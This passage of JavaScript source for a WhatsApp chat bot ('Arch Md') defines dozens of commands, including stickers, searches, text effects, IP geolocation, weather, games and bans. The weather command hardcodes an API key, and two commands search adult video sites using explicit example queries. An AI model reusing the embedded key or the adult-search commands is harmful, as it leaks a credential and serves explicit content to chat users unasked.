if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
const aliveMsg = global.db.settings.alive || `Hi I'm arch Md a bot created by Ednut deployed by ${ownername}\nto set your preffered alive message use ${prefix}setalive!`
m.reply(aliveMsg)
}
break

case 'tovv': case 'toonce': case 'toviewonce': { 
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if  (!/image|video/.test(mime)) return m.reply(example(`Reply Image/Video`))
if (/image/.test(mime)) {
let anuan = await ednut.downloadAndSaveMediaMessage(quoted)
await ednut.sendMessage(m.chat, {image: {url:anuan}, caption: `Here it is!!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
let anuanuan = await ednut.downloadAndSaveMediaMessage(quoted)
await ednut.sendMessage(m.chat, {video: {url:anuanuan}, caption: `here it is!!`, fileLength: "999", viewOnce : true},{quoted: m })
}
}
break

case 'write': case 'ttp': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
	   if (!text) return m.reply(example(`Ednut`))
	const text2png = require('text2png');
	await fs.writeFileSync('out.png', text2png(q, {font: '100px coolvetica rg',
		localFontPath: 'start/lib/font/coolvetica rg.otf',
	  localFontName: 'coolvetica rg',                                            
	  color: 'white',
	  textAlign: "left",
	  lineSpacing: 10,
	  strokeColor: "black",
	  strokeWidth : 2,
	  padding: 20}))
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('out.png')
	let jancok = new Sticker(media, {
		pack: 'Arch Md ²⁵', // The pack name
		author: 'Ednut', // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: 70, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await ednut.sendMessage(m.chat,{sticker: nah},{quoted:m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync('out.png')
	}
	break
	
	case 'stickersearch':{
	if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
	if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example(`patrick`))
  try {
    let res = await fetch(`https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    if (json.status !== 200 || !json.data.sticker_url.length) {
      m.reply('no sticker found.')
    }

    let stickers = json.data.sticker_url;
    let message = 'sticker link:\n' + stickers.join('\n');

    await ednut.sendMessage(m.chat, { text: message }, { quoted: m });
  } catch (e) {
    m.reply(`error can't search stickers`);
  }
};
break


case 'githubsearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example(`Arch-Md`))
  try {
    // result data from api
    let res = await fetch(`https://api.agatz.xyz/api/github?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // fetch api response 
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'data not found....';
    }

    // if api response positive
    let repos = json.data;
    let message = `Repository data *${text}*:\n\n`;

    // result from api
    repos.forEach(repo => {
      message += `Name: ${repo.fullName}\n` +
                 `   URL: ${repo.htmlUrl}\n` +
                 `   Repocreation: ${repo.createdAt}\n` +
                 `   Last Updated: ${repo.updatedAt}\n` +
                 `   Watchers: ${repo.watchers}\n` +
                 `   Forks: ${repo.forks}\n` +
                 `   Stars: ${repo.stargazersCount}\n` +
                 `   Open Issues: ${repo.openIssues}\n` +
                 `   Description: ${repo.description || 'No description'}\n` +
                 `   Clone URL: ${repo.cloneUrl}\n\n`;
    });
m.reply(message)
    /*/ sending messages with a list of repositories 
    await ednut.sendMessage(m.chat, {
      text: message,
    });*/

  } catch (e) {
    // if catch error
    await ednut.sendMessage(m.chat, `can't searh stickers error`);
  }
};
break

case 'npmsearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example(`axios`))
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break

case 'xvideosearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!text) return m.reply(example(`Milf`))
  try {
    // checking data from api
    let res = await fetch(`https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // checking api response status
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'No videos found for this keyword.';
    }

    // fetching search data from api
    let videos = json.data;
    let message = `Arch Md xvideo search result\n\n *"${text}"*:\n`;

    // Composing messages with video information
    videos.forEach(video => {
      message += `Title: ${video.title || 'no name'}\n` +
                 `  Duration: ${video.duration || 'no duration'}\n` +
                 `  URL: ${video.url || 'no URL'}\n` +
                 `  Thumbnail: ${video.thumb || 'no thumbnail'}\n\n`;
    });

    // Sending messages with video lists
    await ednut.sendMessage(m.chat, {
      text: message,
    });

  } catch (e) {
    // Handling errors and sending error messages
    await ednut.sendMessage(m.chat, `can't fetch result from query`);
  }
}
break


case 'xnxxsearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!text) return m.reply(example(`stepmoms`))
  let response = await fetch(`https://api.agatz.xyz/api/xnxx?message=${text}`);
  let res = await response.json();

  if (res.status !== 200) throw `API Error: ${res.creator}`;

  let resultText = '';
  for (let i = 0; i < res.data.result.length; i++) {
    let result = res.data.result[i];
    let hasil = `• Title: *${result.title}*\n• Info: *${result.info}*\n• Link: *${result.link}*\n`;
    resultText += hasil + '\n';
  }

  let name = m.sender;
  // result from contextInfo
  await ednut.sendMessage(m.chat, {
    text: resultText
  });
};
break

           case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!q) return m.reply(example(`Arch Md`))
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
ednut.sendMessage(m.chat, { image: { url: haldwhd }, caption: `ᴀʀᴄʜ ᴍᴅ ²⁵` }, { quoted: m })
}
break

case 'getdevice':
case 'device':
case 'phone': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!m.quoted) return m.reply(example(`reply to a chat`))
await ednut.sendMessage(m.chat, {text: `@${m.quoted.sender.split('@')[0]} is using ${await getDevice(m.quoted.id)}`}, {quoted: m})
}
break

case "owner": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
await ednut.sendContact(m.chat, [`${global.owner}`], `Chat ${ownername}`, null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: `${global.thumb}`, 
title: `© ${global.botname}`, 
renderLargerThumbnail: true, 
sourceUrl: `https://wa.me/${global.owner}`,
mediaType: 1
}}})
}
break

case 'readmore': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
await ednut.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;

case 'setppbot': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
				if (!isCreator) return m.reply(mess.owner)
				if (!quoted) return m.reply(example(`reply image`))
				if (!/image/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
				if (/webp/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
				let media = await ednut.downloadAndSaveMediaMessage(quoted)
				await ednut.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
			}
			break
	
			case 'deleteppbot': 
			case 'delppbot': {
			if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
				if (!isCreator) return m.reply(mess.owner);
				await ednut.removeProfilePicture(ednut.user.id)
			}
			break;

case 'trackip':
{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example(`112.90.150.204`))
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await ednut.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
await m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break


case 'fancy': 
case 'styletext': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!text) return m.reply(example('Enter Query text!'))
  let anu = await styletext(text)
  let teks = `Style Text From ${text}\n\n`
  for (let i = 0; i < anu.length; i++) {
    teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`
  }
  await m.reply(teks)
} 
break

case 'charge': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
const { performance } = require('perf_hooks'); // For measuring latency
let startTime = performance.now(); // Start time
// Construct the initial message
let initialMessage = 
 `battery 🪫 low
╔═══════════╗
║░░░░░░░░░░░╚╗
║░░░░░1%░░░░░░║
║░░░░░░░░░░░╔╝
╚═══════════╝`;

try {
// Send the initial message and get the message ID
let sentMessage = await ednut.sendMessage(m.chat, { text: initialMessage });
let initialMessageId = sentMessage.key.id; // Use sentMessage.key.id for the message ID
// Schedule the first edit after 2 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🪫 _Charging..._
╔═══════════╗
║██░░░░░░░░░╚╗
║██░░░⚡░░░░░░║
║██░░░░░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('First edit successful.');
} catch (error) {
console.error('Error during first edit:', error);
}
}, 2000); // 2000 ms = 2 seconds
// Schedule the second edit after 4 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🪫 _Charging..._
╔═══════════╗
║████░░░░░░░╚╗
║████░30%░░░░░║
║████░░░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Second edit successful.');
} catch (error) {
console.error('Error during second edit:', error);
}
}, 4000); // 4000 ms = 4 seconds
// Schedule the third edit after 6 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🔋 _Charging..._
╔═══════════╗
║██████░░░░░╚╗
║█████░50%░░░░║
║██████░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Third edit successful.');
} catch (error) {
console.error('Error during third edit:', error);
}
}, 6000); // 6000 ms = 6 seconds
// Schedule the fourth edit after 8 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🔋 _Charging..._
╔═══════════╗
║█████████░░╚╗
║███░75%░░█░░░║
║█████████░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Fourth edit successful.');
} catch (error) {
console.error('Error during fourth edit:', error);
}
}, 8000); // 8000 ms = 8 seconds

// Schedule the fifth edit after 10 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: `🔋~_.Charged._~
╔═══════════╗
║███████████╚╗
║███░100%░████║
║███████████╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Fifth edit successful.');
} catch (error) {
console.error('Error during fifth edit:', error);
}
}, 10000); // 10000 ms = 10 seconds
// Schedule the final message after 12 seconds
setTimeout(async () => {
try {
await ednut.sendMessage(m.chat, {
text: ` 💜😽𝙳𝚎𝚊𝚛 reader 🌚❤️

       ｡ﾟﾟ･｡･ﾟﾟ｡
         ﾟ。        ｡ﾟ
             ﾟ･｡･ﾟ
       ︵               ︵
    (        ╲       /       /
      ╲          ╲/       /
           ╲          ╲  /
          ╭ ͡   ╲           ╲
     ╭ ͡   ╲        ╲       ﾉ
╭ ͡   ╲        ╲         ╱
 ╲       ╲          ╱
      ╲         ╱
          ︶
> -𝙸 𝚕𝚘𝚟𝚎 𝚞 𝚌𝚊𝚗 𝚒 𝚐𝚎𝚝 𝚒𝚝 𝚋𝚊𝚌𝚔🥺♥️
> 𝐂𝐫𝐞𝐝𝐢𝐭:- Silentzbotid`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Final edit successful.');
} catch (error) {
console.error('Error during final edit:', error);
}
}, 12000); // 12000 ms = 12 seconds
} catch (error) {
console.error('Error sending initial message:', error);
}
}
break;

case 'support': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
const support = `channel:- https://whatsapp.com/channel/0029VbAQfFGBVJl6W26JXy2n\n\ngroup1:- https://chat.whatsapp.com/JEqGxcldMOP0wojK4TTstw\n\ngroup2:- https://chat.whatsapp.com/GmHOFOqQsM8A160ZCjcVnb!`
m.reply(support)
}
break

case 'mine': case 'steal': case 'stickerwm': case 'take': case 'wm': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!/image|video/.test(mime)) return m.reply(example("reply to a sticker to steal"))   
const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
  }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : (m.pushName)
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await ednut.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await ednut.sendMessage(m.chat,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
break

case 'ttc':
            case 'ttt':
            case 'tictactoe': {
            if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    m.reply('partner detected...!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

First ✅: @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await ednut.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await ednut.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    m.reply('Waiting for partner type .tictactoe to join' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break;
            case 'delttc':
            case 'delttt': {
            if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        ednut.sendText(m.chat, `Successfully delete TicTacToe session`, m)
                    } else if (!this.game) {
                        m.reply(`Session TicTacToe🎮 Session is missing`)
                    } else m.reply('?')
                } catch (e) {
                    m.reply('error')
                }
            }
            break;
			
			case 'dare':
			if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
              const dare =[             
"Send a funny face selfie to the group", "Tell a secret about yourself that no one knows", "Sing a song out loud and record it, then send it to the group", "Do 10 push-ups and send a video as proof", "Send a voice note saying 'I love you' to a random contact", "Share your most embarrassing moment", "Send a photo of your favorite food", "Write a short poem and share it with the group", "Do a funny dance and send a video", "Call a friend and have a 5-minute conversation in a made-up language", "Send a photo of your bedroom", "Share your biggest fear", "Send a voice note of you singing a popular song", "Tell a joke and make everyone laugh", "Send a photo of your favorite hobby", "Write a short story and share it with the group", "Do 5 jumping jacks and send a video as proof", "Share your favorite quote", "Send a photo of your favorite book", "Call a friend and have a 10-minute conversation without laughing", "Send a voice note saying 'I'm sorry' to someone you wronged", "Share your most proud moment", "Send a photo of your favorite sports team", "Write a love letter to your crush", "Do a funny impression of a friend and send a video", "Share your biggest regret", "Send a photo of your favorite animal", "Tell a scary story and make everyone believe it", "Send a voice note of you rapping a popular song", "Share your favorite travel destination", "Send a photo of your favorite type of music", "Write a poem about a friend and share it with the group", "Do 10 sit-ups and send a video as proof", "Share your favorite type of food", "Send a photo of your favorite type of car", "Tell a joke in a made-up language", "Send a voice note saying 'Thank you' to someone who helped you", "Share your most embarrassing habit", "Send a photo of your favorite type of music instrument", "Write a short script and act it out with friends", "Do a funny skit and send a video", "Share your favorite type of sport", "Send a photo of your favorite type of pet", "Tell a story about a friend's embarrassing moment", "Send a voice note of you beatboxing a popular song", "Share your favorite type of video game", "Send a photo of your favorite type of movie", "Write a love letter to your best friend", "Do a funny magic trick and send a video", "Share your favorite type of TV show"
]
              const archdare = dare[Math.floor(Math.random() * dare.length)]
              await ednut.sendMessage(m.chat, {text: archdare}, {quoted: m})
              break
              
              	case 'truth':
              	if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
              const truth =[
"If you could go back in time, what would you change?", "What's the biggest lie you've ever told?", "What's your deepest fear?", "What's the one thing you can't live without?", "Who's your celebrity crush?", "What's the most embarrassing thing that's ever happened to you?", "What's your biggest regret?", "What's the one thing you're proud of accomplishing?", "If you could switch lives with someone for a day, who would it be?", "What's the biggest secret you've ever kept?", "What's your favorite childhood memory?", "What's the one thing you're looking forward to doing in the next year?", "If you could travel anywhere in the world, where would you go?", "What's your favorite hobby and why do you enjoy it?", "What's the most spontaneous thing you've ever done?", "What's your favorite type of music and why?", "If you could have dinner with any historical figure, who would it be?", "What's the biggest risk you've ever taken?", "What's your favorite type of book and why?", "If you could go on a date with any celebrity, who would it be?", "What's the one thing you're most proud of about yourself?", "What's your favorite type of movie and why?", "If you could switch lives with your parents for a day, what would you do?", "What's the biggest lesson you've learned from a past relationship?", "What's your favorite type of food and why?", "If you could have any superpower, what would it be?", "What's the one thing you're most grateful for in your life?", "What's your favorite type of sport and why?", "If you could go back and give advice to your younger self, what would it be?", "What's the biggest challenge you've faced and how did you overcome it?", "What's your favorite type of music festival and why?", "If you could have a 30-minute conversation with your future self, what would you ask?", "What's the one thing you're most looking forward to doing in the next 5 years?", "What's your favorite type of vacation and why?", "If you could have any type of pet, what would it be?", "What's the biggest thing you're currently struggling with?", "What's your favorite type of holiday and why?", "If you could go on a road trip with any celebrity, who would it be?", "What's the one thing you're most proud of accomplishing in the past year?", "What's your favorite type of restaurant and why?"
]
              const archtruth = truth[Math.floor(Math.random() * truth.length)]
              await ednut.sendMessage(m.chat, {text: archtruth}, {quoted: m})
              break
              
case 'weather':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example('location'))
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           ednut.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

case 'getpp': 
case 'pp': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  let users = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net')
  try {
    avatar = await ednut.profilePictureUrl(users, "image")
  } catch {
    avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
  }
  await ednut.sendMessage(m.chat, {image: {url: avatar }, caption: `Profile picture of @${users.split('@')[0]}` }, {quoted: m })
} 
break

case 'ban': {
if (!isCreator) return m.reply(mess.owner)
let Ednut = '2347036214381'
let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : '')
if (!user) return m.reply(example('Reply or tag a user!'))
if (user === botNumber) return m.reply('I cannot ban myself!')
if (user === Ednut +"@s.whatsapp.net") return m.reply('I cannot ban my Creator!')
if (!global.db.users[user]) global.db.users[user] = {}
if (global.db.users[user].banned) return m.reply(`User @${user.split('@')[0]} is already banned!`)
global.db.users[user].banned = true
m.reply(`User @${user.split('@')[0]} has been banned from using the bot command!`)
}
break

case 'unban': {
if (!isCreator) return m.reply(mess.owner)
let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : '')
if (!user) return m.reply(example('Reply or tag a user!'))
if (!global.db.users[user]) global.db.users[user] = {}
if (!global.db.users[user].banned) return m.reply(`User @${user.split('@')[0]} is not banned!`)
global.db.users[user].banned = false
m.reply(`User @${user.split('@')[0]} has been unbanned and can now use the bot!`)
}
break

case 'say': case 'tts': case 'gtts':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!text) return m.reply(example('text'))
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return ednut.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
        
case 'repo': case 'repository': {
ednut.sendMessage(m.chat, { react: { text: '🪀', key: m.key }})
  try {
    const response = await axios.get(`https://api.github.com/repos/Ednut001/Arch-Md`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `*Repository Name :* ${repoData.name}\n*Description :* ${repoData.description}\n*Owner :* ${repoData.owner.login}\n*Stars :* ${repoData.stargazers_count}\n*Forks :* ${repoData.forks_count}\n*session :* https://arch-md-session.onrender.com/\n\n*URL :* ${repoData.html_url}\n`;
      reply4(formattedInfo);
    } else {
      await m.reply(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
